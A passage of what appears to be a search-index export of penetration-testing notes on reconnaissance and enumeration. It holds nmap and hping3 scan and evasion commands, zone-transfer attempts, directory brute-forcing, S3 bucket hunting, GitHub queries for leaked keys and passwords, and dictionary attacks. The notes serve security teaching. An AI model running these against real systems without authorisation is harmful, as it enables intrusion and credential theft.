53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc1c5a6c57ac8af2512aff5d7735c05d",
    "u": "https://enum.tymyrddin.dev/docs/app/api",
    "t": "Scanning an API ",
    "c": "Scanning an API  There are two main architectural styles used in modern APIs: SOAP: a highly structured message protocol that supports multiple low-level protocols. REST: a simpler approach to APIs using HTTP/S as the transport protocol, and typically using JSON format for data transfer. Both types of APIs support HTTP requests and responses and Secure Sockets Layer (SSL), but the similarity ends there. The increase of API-related security threats in recent years has prompted the Open Web Application Security Project (OWASP) to release the API Security Top 10, which helps raise awareness of the most serious API security issues affecting organizations. Use either the ZAP-API Scan or Burp API scan . Resources  OWASP API Security Project",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a024b71865d68290052537f1448d20b6",
    "u": "https://enum.tymyrddin.dev/docs/app/automated",
    "t": "Automated vulnerability scanning ",
    "c": "Automated vulnerability scanning  Pros and cons of using Automated vulnerability scanners : Advantages  Automated scans are easy to repeat, and the results can be shared within a team with ease. These scanners are quick and can test numerous applications efficiently. Open-source solutions exist. Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. Disadvantages  People can often become reliant on these tools. They are extremely “loud” and produce a lot of traffic and logging. This is not good if you are trying to bypass security controls. Open-source solutions are often basic and require expensive licenses to have useful features. They often do not find every vulnerability on an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "af269ce6c0ea692e34a159f21705ac1e",
    "u": "https://enum.tymyrddin.dev/docs/system/snmp",
    "t": "SNMP enumeration ",
    "c": "SNMP enumeration  Default SNMP passwords allow attackers to view or modify the SNMP configuration settings. Attackers can enumerate SNMP on remote network devices for: Information about network resources such as routers, shares, devices, etc. ARP and routing tables Device specific information Traffic statistics And more. Tools  SNMP enumeration tools Remediation  Minimize the attack surface by removing the SNMP agents where not needed. Change default public community strings. Upgrade to SNMPv3, which encrypts the community strings and messages. Implement group policy for additional restriction on anonymous connections. Implement firewalls to restrict unnecessary connections. Implement IPSec filtering. Block access to TCP/UDP ports 161. Encrypt and authenticate using IPSEC.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1f26fd1b6a07d6de4a8e205edf448574",
    "u": "https://enum.tymyrddin.dev/docs/overview",
    "t": "Enumeration overview ",
    "c": "Enumeration overview  Enumerate hosts on the network using Zenmap. Zenmap is a version of Nmap that has a graphical interface. Use Zenmap to create a network topology to help identify the network layout. Try to enumerate users and groups. Try to get a list of SMB shares on the system. Enumerate uniform resource locators (URLs) and retrieve any web pages. Identifying the software running on a system can be tricky. Get creative. For example, use Ncrack to do a dictionary attack on the administrator account and then supply that as the credentials to a script to see a list of the processes running on that system. Get lists of services running on a system by performing an nmap scan. Try to obtain security tokens. Enumerate social media posts by a user with a given IP address by using a tool like recon-ng . A full scan does a variety of tests to identify vulnerabilities in the system. For example, Nessus can be set to use a number of plug-ins such as for checking for security issues with Simple Mail Transfer Protocol (SMTP) and Simple Network Management Protocol (SNMP) services, checking for Linux security issues, and checking for web server and Windows vulnerabilities, etc. Such scans are considered to be aggressive. If red teaming or hired to do a penetration test where the security team is not informed of our presence, we can do a stealth scan and are to put more effort into choosing specific scanning techniques to avoid detection by the blue/security team, for example by not scanning the full IP range sequentially, or scanning ports sequentially, and by using multiple source IP addresses to scan from. Compliance scanning by externals has its own rules and requirements. For example, for compliance with the Payment Card Industry Data Security Standard (PCI DSS) standards, these include: Both internal and external scans must be performed. External scans must be approved by an approved scanning vendor (ASV). Vulnerability scans are to be done quarterly and after any major change to the environment. If critical vulnerabilities are found, they must be remediated and then a new scan done to validate the remediation steps have removed the vulnerability. When doing a vulnerability scan on target systems, do it multiple times, as an anonymous, non-credentialed user, and as a credentialed user with and without administrative credentials. As a non-credentialed user we are not to see information such as the password policies configured, group membership, and other configuration settings. As a credentialed user with an administrative account, we may get information about the configuration of the system including vulnerabilities related to user accounts (for example an account called “administrator” or “admin”) and group membership (too many users in the administrators group), missing patches, and password policy configuration settings.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ea87b6ea64a6f9ab6b5d2083ad091f52",
    "u": "https://enum.tymyrddin.dev/docs/system/netbios",
    "t": "NetBios enumeration ",
    "c": "NetBios enumeration  NetBIOS is outdated but still lives on in some older systems, sometimes for backward compatability. It is the equivalent of broadcasting names to look for each other but is not routable. It is local network only. If no one on the other network can use it for your network, then no one there can access your NetBIOS shared folders and printers, unless one has gained access to your local network. You can also access NetBIOS machines with a WINS server. That is the NetBIOS equivalent of a DNS server. NetBIOS software runs on port 139 on the Windows operating system. File and printer services need to be enabled to enumerate NetBIOS over Windows. An attacker can perform the following on the remote machine: Choosing to read or write to a remote machine, depending on the availability of shares. Launching a Denial of Service (DoS) attack on the remote machine. Enumerating password policies on the remote machine. Tools  NetBios enumeration tools Remediation  Minimise the attack surface by minimising the unnecessary service like Server Message Block (SMB). Remove file and printer sharing in Windows OS.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "454ff8ca59627211003a08a68be3a771",
    "u": "https://enum.tymyrddin.dev/docs/vulns/mapping",
    "t": "Mapping vulnerabilities to exploits ",
    "c": "Mapping vulnerabilities to exploits  Attack tree  1 List and score exploitable vulnerabilities 1.1 by Common Vulnerability Scoring System (CVSS) (OR) 1.1.1 Calculate Exploitability 1.1.2 Calculate Impact 1.1.3 f(Impact) 1.1.4 BaseScore 1.2 by Vulnerability Priority Rating (VPR) 2 Prioritisation possibilities 2.1 Severity level 2.2 Vulnerability exposure 2.3 Criticality Common Vulnerability Scoring System (CVSS)  The Common Vulnerability Scoring System (CVSS) is a standard vulnerability scoring system used by vulnerability scanners to identify the severity of the vulnerability. A CVSS base score can be a number from 0 to 10, with 0 being the least severe, and 10 being the most severe. The format of the base score for CVSS2: CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C Three metrics are used to calculate the exploitability of a vulnerability: The access vector (AV), used to measure how the hacker executes the exploit. Does she have to have physical access to the system, be in an adjacent network and use pivoting, or is the vulnerability exploitable from a remote network? The attack complexity (AC), to describe how easy or difficult it is to exploit the vulnerability. Authentication (Au), used to specify how many times she would need to authenticate to exploit the vulnerability. Exploitability = 20 * AV * AC * Au Impact metrics are used to identify what the impact of the exploit is on the confidentiality (C), integrity (I), and availability (A) of systems and their data. The values can be None (N), Partial (P) or Complete (C) Impact = 10.41 * (1-(1-C)*(1-I)*(1-A)) f(Impact) = 0 if Impact = 0, 1.176 otherwise. End score: BaseScore = roundToOneDecimal(( (0.6*Impact) + (0.4*Exploitability)-1.5) * f(Impact)) Vulnerability Priority Rating (VPR)  The VPR framework is a more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS). Unlike CVSS, VPR scoring takes into account the relevancy of a vulnerability. For example, no risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation. VPR is also considerably dynamic in its scoring, where the risk that a vulnerability may pose can change almost daily as it ages. VPR uses a similar scoring range as CVSS. Two notable differences are that VPR does not have a None/Informational category, and because VPR uses a different scoring method (youtube) , the same vulnerability will have a different score using VPR than when using CVSS. Nessus  In Nessus, the Vulnerability Information includes whether known exploits are available for a vulnerability. The section labeled “Exploitable With” even shows what tools can be used to exploit the vulnerability. Real Risk Score (RRS)  Real Risk Score (RRS) not only takes into account the equation behind the CVSS of each vulnerability, but also the Metasploit modules that could be launched against it, the malware kits detected, and even how old the vulnerability is. Resources  NVD CVSS v2 Calculator NVD CVSS v3 Calculator Vulnerability Priority Rating (VPR) Summary Real Risk Score",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cfeaea289a0f4fb49ef8e455286cfe4b",
    "u": "https://enum.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Application scanning tools can be used to perform an audit on an application. There are basically two types of application audit tools: A dynamic analysis tool assesses vulnerabilities in an application by analysing the behaviour of the application while it is running (how it responds to input). The best is a combination of scanning and using scanners like Zap and Burp in a manual walkthrough. In a static analysis, the source code is reviewed for vulnerabilities. Can be done manually or using an automated vulnerability scanner. Use both for manual and automated scanning of the application. Why?  Move further and deeper into the scanning process to include security scanning and discover vulnerabilities to exploit. How?  Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "275316b5407eae7e98bb36d23e19b8a5",
    "u": "https://enum.tymyrddin.dev/docs/vulns/prioritisation",
    "t": "Prioritisation of vulnerabilities ",
